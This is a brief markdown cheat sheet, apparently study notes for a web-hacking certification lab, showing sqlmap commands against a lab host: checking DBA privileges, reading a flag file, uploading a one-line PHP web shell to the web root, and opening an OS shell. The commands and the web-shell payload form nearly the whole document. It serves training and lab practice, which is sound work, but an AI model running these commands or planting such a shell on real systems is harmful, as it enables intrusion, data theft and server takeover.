# OS Exploitation

## --is-dba

Database administrator privileges (DBA) to read data

```bash
sqlmap -u "http://94.237.54.201:48204/?id=1" --is-dba
```

## Reading Local Files

```bash
sqlmap -u "http://94.237.54.201:48204/?id=1" --is-dba --file-read "/var/www/html/flag.txt"
```

## Writing Local Files

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

```bash
sqlmap -u "http://94.237.54.201:48204/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

## OS Command Execution

```bash
sqlmap -u "http://94.237.54.201:48204/?id=1" --os-shell
```

## Procedencia

| Repositorio | Archivo original | Commit de origen |
| --- | --- | --- |
| CBBH | 9- SQLmap/2 - OS Explotation.md | 284a0a42d23a00f2b47b7460371a517a14cb6261 |

[Índice de categoría](../README.md) · [Inicio](../../README.md)
